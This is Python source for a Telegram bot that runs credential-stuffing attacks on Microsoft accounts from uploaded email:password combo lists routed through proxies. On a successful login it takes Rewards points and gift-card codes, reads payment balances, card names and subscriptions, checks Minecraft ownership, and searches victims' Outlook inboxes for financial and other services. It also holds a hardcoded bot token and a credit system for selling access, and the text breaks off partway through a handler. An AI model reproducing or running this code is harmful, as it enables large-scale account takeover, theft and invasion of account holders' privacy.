import re, json, uuid, sqlite3, logging, asyncio
import time, os, random, threading, requests, urllib3
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from telegram import (Update, InlineKeyboardButton,
                      InlineKeyboardMarkup)
from telegram.ext import (Application, CommandHandler,
    MessageHandler, CallbackQueryHandler,
    ContextTypes, filters)

# ============================================================================
# SECTION 2 — IMPORTS & SETUP
# ============================================================================
urllib3.disable_warnings()
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============================================================================
# SECTION 3 — CONFIG CONSTANTS
# ============================================================================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '5944410248'))
DB = os.environ.get('DB_PATH', 'checker.db')
MAX_EXECUTOR_WORKERS = 500

# flux.py login URL — DO NOT CHANGE
SFTAG_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

# Global proxy list
PROXIES_LIST = []

# Global thread pool
bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
db_lock = threading.Lock()

# ============================================================================
# SECTION 4 — AkazaDatabase CLASS
# ============================================================================
class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path

    def _execute(self, query, params=(), commit=True, fetchone=False, fetchall=False):
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            try:
                cursor.execute(query, params)
                if commit: conn.commit()
                if fetchone: return cursor.fetchone()
                if fetchall: return cursor.fetchall()
            except Exception as e:
                logger.error(f"DB Error: {e}")
            finally: conn.close()

    def init_db(self):
        self._execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            credits INTEGER DEFAULT 0, has_access INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
            join_date TEXT, access_expiry TEXT)''')
        self._execute('''CREATE TABLE IF NOT EXISTS settings (
            user_id INTEGER PRIMARY KEY, keywords TEXT DEFAULT "", threads INTEGER DEFAULT 10, is_adding_kw INTEGER DEFAULT 0, fast_mode INTEGER DEFAULT 0)''')
        self._execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
            status TEXT, details TEXT, date TEXT)''')
        self.add_user(ADMIN_ID, "Admin", "Admin")
        self._execute('UPDATE users SET is_mod = 1, has_access = 1, credits = 999999 WHERE user_id = ?', (ADMIN_ID,))

    def add_user(self, uid, username, first_name):
        now = datetime.now().isoformat()
        self._execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date) VALUES (?, ?, ?, ?)', (uid, username, first_name, now))
        self._execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))

    def is_banned(self, uid) -> bool:
        res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_banned']) if res else False

    def has_access(self, uid) -> bool:
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT has_access, access_expiry, is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if not res or res['is_banned']: return False
        if res['has_access'] == 0: return False
        if res['access_expiry']:
            try:
                if datetime.now() > datetime.fromisoformat(res['access_expiry']): return False
            except: pass
        return True

    def is_mod(self, uid) -> bool:
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_mod']) if res else False

    def add_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))

    def set_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = ? WHERE user_id = ?', (amount, uid))

    def reset_credits(self, uid):
        self._execute('UPDATE users SET credits = 0 WHERE user_id = ?', (uid,))

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        self._execute('UPDATE users SET credits = MAX(0, credits - 1), total_checks = total_checks + 1 WHERE user_id = ?', (uid,))

    def get_credits(self, uid) -> int:
        if uid == ADMIN_ID: return 999999
        res = self._execute('SELECT credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return res['credits'] if res else 0

    def grant_access(self, uid):
        self._execute('UPDATE users SET has_access = 1, access_expiry = NULL WHERE user_id = ?', (uid,))

    def revoke_access(self, uid):
        self._execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))

    def grant_timed_access(self, uid, days):
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        self._execute('UPDATE users SET has_access = 1, access_expiry = ? WHERE user_id = ?', (expiry, uid))

    def ban(self, uid):
        self._execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (uid,))

    def unban(self, uid):
        self._execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (uid,))

    def set_mod(self, uid, val):
        self._execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (val, uid))

    def get_all_user_ids(self) -> list:
        res = self._execute('SELECT user_id FROM users', fetchall=True)
        return [row['user_id'] for row in res] if res else []

    def get_user_info(self, uid) -> dict:
        res = self._execute('SELECT * FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return dict(res) if res else {}

    def get_user_settings(self, uid) -> dict:
        res = self._execute('SELECT keywords, threads, is_adding_kw, fast_mode FROM settings WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            kws = [k.strip() for k in res['keywords'].split(',') if k.strip()]
            return {'keywords': kws, 'threads': res['threads'], 'is_adding_kw': bool(res['is_adding_kw']), 'fast_mode': bool(res['fast_mode'])}
        return {'keywords': [], 'threads': 10, 'is_adding_kw': False, 'fast_mode': False}

    def update_settings(self, uid, keywords=None, threads=None, is_adding_kw=None, fast_mode=None):
        if keywords is not None: self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (",".join(keywords), uid))
        if threads is not None: self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
        if is_adding_kw is not None: self._execute('UPDATE settings SET is_adding_kw = ? WHERE user_id = ?', (1 if is_adding_kw else 0, uid))
        if fast_mode is not None: self._execute('UPDATE settings SET fast_mode = ? WHERE user_id = ?', (1 if fast_mode else 0, uid))

    def save_result(self, uid, email, status, details_dict):
        now = datetime.now().isoformat()
        self._execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, json.dumps(details_dict), now))
        if status == 'hit': self._execute('UPDATE users SET total_hits = total_hits + 1 WHERE user_id = ?', (uid,))

    def user_stats(self, uid) -> dict:
        res = self._execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return {'checks': res['total_checks'], 'hits': res['total_hits'], 'credits': res['credits']} if res else {'checks': 0, 'hits': 0, 'credits': 0}

    def get_global_stats(self) -> dict:
        t = self._execute('SELECT COUNT(*) as total FROM users', fetchone=True)
        a = self._execute('SELECT COUNT(*) as active FROM users WHERE has_access = 1 AND is_banned = 0', fetchone=True)
        c = self._execute('SELECT SUM(total_checks) as checks FROM users', fetchone=True)
        h = self._execute('SELECT SUM(total_hits) as hits FROM users', fetchone=True)
        return {'total': t['total'] if t else 0, 'active': a['active'] if a else 0, 'checks': c['checks'] if c and c['checks'] else 0, 'hits': h['hits'] if h and h['hits'] else 0}

    def list_mods(self) -> list:
        res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
        return [{'uid': row['user_id'], 'username': row['username']} for row in res] if res else []

akaza_db = AkazaDatabase(DB)

# ============================================================================
# SECTION 5 — SERVICE_KEYWORDS DICT
# ============================================================================
SERVICE_KEYWORDS = {
    # Social
    "instagram.com": "Instagram", "mail.instagram.com": "Instagram",
    "facebook.com": "Facebook", "facebookmail.com": "Facebook",
    "twitter.com": "Twitter", "x.com": "Twitter", "tiktok.com": "TikTok",
    "snapchat.com": "Snapchat", "discord.com": "Discord", "telegram.org": "Telegram",
    "reddit.com": "Reddit", "linkedin.com": "LinkedIn", "twitch.tv": "Twitch",
    "onlyfans.com": "OnlyFans", "patreon.com": "Patreon", "vk.com": "VK",
    "whatsapp.com": "WhatsApp", "youtube.com": "YouTube",
    # Streaming
    "netflix.com": "Netflix", "info@netflix.com": "Netflix", "spotify.com": "Spotify",
    "disneyplus.com": "Disney+", "hulu.com": "Hulu", "hbo.com": "HBO",
    "amazon.com": "Amazon", "primevideo.com": "Prime Video", "apple.com": "Apple",
    "peacocktv.com": "Peacock", "paramountplus.com": "Paramount+", "tidal.com": "Tidal",
    "deezer.com": "Deezer",
    # Gaming
    "xbox.com": "Xbox", "playstation.com": "PlayStation", "nintendo.com": "Nintendo",
    "steampowered.com": "Steam", "epicgames.com": "Epic Games", "riotgames.com": "Riot Games",
    "minecraft.net": "Minecraft", "roblox.com": "Roblox", "ubisoft.com": "Ubisoft",
    "ea.com": "EA", "blizzard.com": "Blizzard", "valorant.com": "Valorant",
    "fortnite.com": "Fortnite", "pubg.com": "PUBG", "callofduty.com": "COD",
    "rockstargames.com": "Rockstar",
    # Finance
    "paypal.com": "PayPal", "venmo.com": "Venmo", "cash.app": "CashApp",
    "stripe.com": "Stripe", "revolut.com": "Revolut", "wise.com": "Wise",
    "coinbase.com": "Coinbase", "binance.com": "Binance", "kraken.com": "Kraken",
    "robinhood.com": "Robinhood",
    # Shopping
    "ebay.com": "eBay", "aliexpress.com": "AliExpress", "etsy.com": "Etsy",
    "walmart.com": "Walmart", "target.com": "Target", "shopify.com": "Shopify",
    "nike.com": "Nike", "adidas.com": "Adidas",
    # Food & Travel
    "ubereats.com": "UberEats", "doordash.com": "DoorDash", "grubhub.com": "GrubHub",
    "deliveroo.co.uk": "Deliveroo", "uber.com": "Uber", "lyft.com": "Lyft",
    "airbnb.com": "Airbnb", "booking.com": "Booking.com", "expedia.com": "Expedia",
    # Cloud & VPN
    "dropbox.com": "Dropbox", "google.com": "Google Drive", "onedrive.com": "OneDrive",
    "icloud.com": "iCloud", "nordvpn.com": "NordVPN", "expressvpn.com": "ExpressVPN",
    "surfshark.com": "Surfshark", "protonvpn.com": "ProtonVPN",
    # Education & Productivity
    "coursera.org": "Coursera", "udemy.com": "Udemy", "duolingo.com": "Duolingo",
    "grammarly.com": "Grammarly", "office365.com": "Office 365", "zoom.us": "Zoom",
    "slack.com": "Slack", "adobe.com": "Adobe", "canva.com": "Canva"
}

# ============================================================================
# SECTION 6 — AkazaChecker CLASS
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            p = self.format_proxy(proxy)
            self.session.proxies = {'http': p, 'https': p}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0'
        })

    def format_proxy(self, px):
        px = px.strip()
        if px.startswith(('http://', 'https://', 'socks')): return px
        p = px.split(':')
        if len(p) == 4: return f'http://{p[2]}:{p[3]}@{p[0]}:{p[1]}'
        return f'http://{px}' if len(p) == 2 else px

    def get_sftag_params(self):
        for _ in range(3):
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}
                text = self.session.get(SFTAG_URL, headers=headers, timeout=10, verify=False).text
                match = (re.search(r'value=\\\\"(.+?)\\\\"', text, re.S) or
                         re.search(r'value="(.+?)"', text, re.S) or
                         re.search(r"sFTTag:'(.+?)'", text, re.S) or
                         re.search(r'sFTTag:"(.+?)"', text, re.S) or
                         re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
                if match:
                    ppft = match.group(1)
                    match = (re.search(r'"urlPost":"(.+?)"', text, re.S) or
                             re.search(r"urlPost:'(.+?)'", text, re.S) or
                             re.search(r'urlPost:"(.+?)"', text, re.S) or
                             re.search(r'<form.*?action="(.+?)"', text, re.S))
                    if match: return match.group(1).replace('&amp;', '&'), ppft
            except: pass
            time.sleep(0.1)
        return None, None

    def do_login(self, email, password, urlPost, ppft):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
                r = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=12, verify=False)
                if '#' in r.url and r.url != SFTAG_URL:
                    tk = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                    if tk and tk != 'None': return ('TOKEN', tk)
                elif 'cancel?mkt=' in r.text:
                    try:
                        ipt = re.search(r'name="ipt".*?value="(.+?)"', r.text).group(1)
                        pprid = re.search(r'name="pprid".*?value="(.+?)"', r.text).group(1)
                        uaid = re.search(r'name="uaid".*?value="(.+?)"', r.text).group(1)
                        act = re.search(r'id="fmHF".*?action="(.+?)"', r.text).group(1)
                        r2 = self.session.post(act, data={'ipt':ipt, 'pprid':pprid, 'uaid':uaid}, allow_redirects=True, timeout=10, verify=False)
                        ru = re.search(r'"recoveryCancel":{"returnUrl":"(.+?)"}', r2.text).group(1)
                        r3 = self.session.get(ru, allow_redirects=True, timeout=10, verify=False)
                        tk = parse_qs(urlparse(r3.url).fragment).get('access_token', [None])[0]
                        if tk: return ('TOKEN', tk)
                    except: pass
                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=']): return ('2FA', None)
                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times']): return ('BAD', None)
            except: pass
        return ('ERROR', None)

    def handle_fmhf(self, resp):
        for _ in range(5):
            if 'fmHF' not in resp.text: break
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form', id='fmHF')
            if not form: break
            data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
            action = form.get('action')
            if action.startswith('/'): action = 'https://login.live.com' + action
            resp = self.session.post(action, data=data, verify=False)
        return resp

    def get_rewards_points(self):
        try:
            r = self.session.get("https://rewards.bing.com/api/getuserinfo", timeout=8, verify=False)
            if r.status_code == 200:
                d = r.json()
                pts = d.get('availablePoints') or d.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
                if pts is not None: return int(pts)
            r = self.session.get("https://www.bing.com/rewardsapp/flyoutHub?format=json", timeout=8, verify=False)
            if r.status_code == 200:
                d = r.json()
                if 'userInfo' in d and 'balance' in d['userInfo']: return int(d['userInfo']['balance'])
            r = self.handle_fmhf(self.session.get("https://rewards.bing.com", timeout=10, verify=False))
            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if m and 0 <= int(m.group(1)) <= 500000: return int(m.group(1))
        except: pass
        return 0

    def get_redemption_codes(self):
        codes = []
        exclude_words = {'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM', 'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS', 'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION', 'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER', 'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE', 'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER', 'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER', 'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB', 'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS', 'MINECOINS', 'ROBUX', 'GIFT', 'CARD', 'ORDER', 'CODE', 'FOUND', 'DIGITAL-CODE', 'REDEMPTION', 'REDEEM', 'DOWNLOAD', 'INSTANT', 'DELIVERY', 'ONLINE', 'ACCESS', 'CONTENT', 'DLC', 'EXPANSION', 'SEASON', 'TOKEN', 'CURRENCY', 'VIRTUAL', 'ITEM'}
        try:
            r = self.handle_fmhf(self.session.get('https://rewards.bing.com/redeem/orderhistory', headers={'Referer': 'https://rewards.bing.com/'}, timeout=10, verify=False))
            soup = BeautifulSoup(r.text, 'html.parser')
            vt_input = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            vt = vt_input.get('value', '') if vt_input else ''
            rows = soup.find('table', class_='table').find_all('tr') if soup.find('table', class_='table') else []
            pats = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3: continue
                title, date = cells[2].get_text(strip=True), cells[1].get_text(strip=True)
                btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if btn:
                    act = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act.startswith('/'): act = 'https://rewards.bing.com' + act
                    cr = self.session.post(act, data={'__RequestVerificationToken': vt}, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10, verify=False).text
                    code_found = False
                    # a. resendSuccess
                    csoup = BeautifulSoup(cr, 'html.parser')
                    rs = csoup.find('div', class_='resendSuccess')
                    if rs:
                        keys = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
                        vals = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
                        for k, v in zip(keys, vals):
                            if any(x in k.get_text(strip=True).upper() for x in ['CODE', 'PIN']):
                                c = v.get_text(strip=True)
                                if '*' not in c:
                                    codes.append({'code': c, 'category': self.detect_category(title, cr), 'redemption_url': '', 'date': date})
                                    code_found = True; break
                    if code_found: continue
                    # b-g. Patterns and others
                    ru = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', cr)
                    cat = self.detect_category(title, cr)
                    for p in pats:
                        m = re.search(p, cr)
                        if m and '*' not in m.group() and m.group().upper() not in exclude_words:
                            codes.append({'code': m.group(), 'category': cat, 'redemption_url': ru.group(1) if ru else '', 'date': date})
                            code_found = True; break
                    if not code_found:
                        m = re.search(r'(?:PIN|CODE)\s*:\s*([A-Z0-9]{4}-[A-Z0-9\-]+)', cr, re.I)
                        if m: codes.append({'code': m.group(1), 'category': cat, 'redemption_url': '', 'date': date})
                else:
                    code_text = cells[3].get_text(strip=True) if len(cells) > 3 else cells[2].get_text(strip=True)
                    cat = self.detect_category(title, code_text)
                    for p in pats:
                        m = re.search(p, code_text)
                        if m and '*' not in m.group() and m.group().upper() not in exclude_words:
                            codes.append({'code': m.group(), 'category': cat, 'redemption_url': '', 'date': date})
                            break
        except: pass
        return codes

    def detect_category(self, title, row_text=''):
        t = (title + row_text).lower()
        if 'overwatch' in t: return 'Overwatch'
        if 'sea of thieves' in t: return 'Sea of Thieves'
        if 'roblox' in t or 'robux' in t: return 'Roblox'
        if 'league' in t or 'riot' in t: return 'League of Legends'
        if 'game pass' in t or 'gamepass' in t: return 'Game Pass'
        if 'minecraft' in t: return 'Minecraft'
        if any(x in t for x in ['gift card', 'amazon', 'steam', 'xbox', 'nintendo', 'playstation', 'starbucks', 'walmart', 'spotify']): return 'Gift Card'
        return 'Unknown'

    def get_microsoft_subs(self):
        try:
            uid = str(uuid.uuid4()).replace('-', '')[:16]
            u = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(json.dumps({'userId': uid, 'scopeSet': 'pidl'}))}&prompt=none"
            r = self.session.get(u, headers={"Referer": "https://account.microsoft.com/"}, timeout=15, verify=False)
            tk_m = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
            if not tk_m: return {"status":"FREE","subs":[],"balance":"","card":""}
            tk = unquote(tk_m.group(1))
            h = {"Authorization": f'MSADELEGATE1.0="{tk}"', "ms-cV": str(uuid.uuid4()), "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
            bal_r = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=h, timeout=12, verify=False).text
            bal_m = re.search(r'"balance"\s*:\s*([0-9.]+)', bal_r)
            card_m = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', bal_r, re.S)
            rt = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=h, timeout=12, verify=False).text
            subs = []
            keys = {'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE', 'PC Game Pass': 'PC GAME PASS', 'Xbox Game Pass': 'GAME PASS', 'EA Play': 'EA PLAY', 'Xbox Live Gold': 'XBOX LIVE GOLD', 'Microsoft 365 Family': 'M365 FAMILY', 'Microsoft 365 Personal': 'M365 PERSONAL', 'Office 365': 'OFFICE 365', 'OneDrive': 'ONEDRIVE'}
            for k, disp in keys.items():
                if k in rt:
                    rd_m = re.search(rf'"{k}".*?"nextRenewalDate"\s*:\s*"([^T"]+)', rt, re.S)
                    subs.append({'name': disp, 'is_expired': False, 'renewal_date': rd_m.group(1) if rd_m else 'N/A'})
            return {"status": "PREMIUM" if subs else "FREE", "subs": subs, "balance": "$"+bal_m.group(1) if bal_m else "", "card": card_m.group(1) if card_m else ""}
        except: return {"status":"FREE","subs":[],"balance":"","card":""}

    def get_profile(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=12, verify=False).json()
            return r.get('displayName', 'N/A'), r.get('country') or r.get('location', {}).get('country') or 'N/A'
        except: return 'N/A', 'N/A'

    def get_minecraft(self, tk):
        try:
            r1 = self.session.post("https://user.auth.xboxlive.com/user/authenticate", json={"Properties":{"AuthMethod":"RPS","SiteName":"user.auth.xboxlive.com","RpsTicket":f"d={tk}"},"RelyingParty":"http://auth.xboxlive.com","TokenType":"JWT"}, timeout=10, verify=False).json()
            xbl_tk, uhs = r1['Token'], r1['DisplayClaims']['xui'][0]['uhs']
            r2 = self.session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={"Properties":{"SandboxId":"RETAIL","UserTokens":[xbl_tk]},"RelyingParty":"rp://api.minecraftservices.com/","TokenType":"JWT"}, timeout=10, verify=False).json()
            xsts_tk = r2['Token']
            r3 = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox", json={"identityToken":f"XBL3.0 x={uhs};{xsts_tk}"}, timeout=10, verify=False).json()
            mc_tk = r3['access_token']
            r4 = self.session.get("https://api.minecraftservices.com/minecraft/profile", headers={"Authorization":f"Bearer {mc_tk}"}, timeout=10, verify=False)
            if r4.status_code == 200: d = r4.json(); return {"owned": True, "username": d['name']}
        except: pass
        return {"owned": False}

    def scan_inbox(self, tk, cid, uk):
        res = {}
        combined = list(set(list(SERVICE_KEYWORDS.keys()) + uk))
        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
        for i in range(0, len(combined), 8):
            batch = combined[i:i+8]
            q = " OR ".join([f'"{k}"' for k in batch])
            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": q}, "Size": 25}]}
            try:
                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=12, verify=False).json()
                rset = r['EntitySets'][0]['ResultSets'][0]
                if rset.get('Total', 0) > 0:
                    for hit in rset.get('Results', []):
                        text = (hit.get('Subject', '') + hit.get('Preview', '')).lower()
                        for k in batch:
                            if k.lower() in text:
                                name = SERVICE_KEYWORDS.get(k, k)
                                res[name] = res.get(name, 0) + 1
            except: pass
        return res

    async def check(self, email, password, uk=[], fast=False):
        loop = asyncio.get_running_loop()
        try:
            up, ppft = await loop.run_in_executor(bot_executor, self.get_sftag_params)
            if not up:
                logger.error(f"SFTAG failed for {email}")
                return {'status': 'error', 'email': email, 'password': password}
            status, token = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, ppft)
            if status != 'TOKEN':
                return {'status': status.lower(), 'email': email, 'password': password}

            cid = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), 'N/A')

            if fast:
                pts = await loop.run_in_executor(bot_executor, self.get_rewards_points)
                codes = await loop.run_in_executor(bot_executor, self.get_redemption_codes)
                return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': {}, 'name': 'N/A', 'country': 'N/A', 'mc': {'owned': False}, 'inbox': {}}

            # Run captures in parallel
            tasks = [
                loop.run_in_executor(bot_executor, self.get_rewards_points),
                loop.run_in_executor(bot_executor, self.get_redemption_codes),
                loop.run_in_executor(bot_executor, self.get_microsoft_subs),
                loop.run_in_executor(bot_executor, self.get_profile, token, cid),
                loop.run_in_executor(bot_executor, self.get_minecraft, token),
                loop.run_in_executor(bot_executor, self.scan_inbox, token, cid, uk)
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Safe unpacking
            pts = results[0] if not isinstance(results[0], Exception) else 0
            codes = results[1] if not isinstance(results[1], Exception) else []
            subs = results[2] if not isinstance(results[2], Exception) else {"status":"FREE","subs":[],"balance":"","card":""}
            name, country = results[3] if not isinstance(results[3], Exception) else ('N/A', 'N/A')
            mc = results[4] if not isinstance(results[4], Exception) else {"owned": False}
            inbox = results[5] if not isinstance(results[5], Exception) else {}

            return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': subs, 'name': name, 'country': country, 'mc': mc, 'inbox': inbox}
        except Exception as e:
            logger.exception(f"Check error for {email}: {e}")
            return {'status': 'error', 'email': email, 'password': password}

# ============================================================================
# BOT HANDLERS
# ============================================================================
user_proxies = {}
pending_files = {}

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    akaza_db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if akaza_db.is_banned(uid): return
    akaza_db.update_settings(uid, is_adding_kw=False)
    i, s = akaza_db.get_user_info(uid), akaza_db.get_user_settings(uid)
    msg = (f"💠 <b>AKAZA Bot Dashboard</b> 💠\n\n"
           f"👤 <b>User:</b> <code>{u.effective_user.first_name}</code>\n"
           f"💰 <b>Credits:</b> <code>{i['credits']}</code>\n"
           f"⚙️ <b>Threads:</b> <code>{s['threads']}</code>\n"
           f"🔑 <b>Keywords:</b> <code>{len(s['keywords'])}</code>")
    kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
           [InlineKeyboardButton("🔍 Keywords", callback_data="kw_mode"), InlineKeyboardButton("🌐 Proxy", callback_data="proxy")],
           [InlineKeyboardButton("📖 Help", callback_data="help")]]
    if akaza_db.is_mod(uid): kbd.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
    if u.callback_query: await u.callback_query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")
    else: await u.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def handle_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid): return
    s = akaza_db.get_user_settings(uid)
    if s.get('is_adding_kw'):
        kws = u.message.text.split()
        all_kws = list(set(s['keywords'] + kws))
        akaza_db.update_settings(uid, keywords=all_kws)
        await u.message.reply_text(f"✅ Added {len(kws)} keywords. Total: {len(all_kws)}.\nUse /skw to stop.")
        return
    if ':' in u.message.text: await handle_combo(u, c, u.message.text)

async def handle_document(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid): return
    doc = u.message.document
    if not doc or not doc.file_name.lower().endswith('.txt'): return

    file = await c.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8', 'ignore')

    caption = (u.message.caption or "").lower()
    if 'prox' in caption:
        user_proxies[uid] = [AkazaChecker().format_proxy(l.strip()) for l in content.splitlines() if l.strip()]
        await u.message.reply_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")
        return

    pending_files[uid] = content
    kbd = [[InlineKeyboardButton("📁 Combo List", callback_data="set_combo"), InlineKeyboardButton("🔌 Proxy List", callback_data="set_proxy")]]
    await u.message.reply_text(f"❓ <b>File:</b> <code>{doc.file_name}</code>\nSelect the file type:", reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid) or not akaza_db.has_access(uid): return
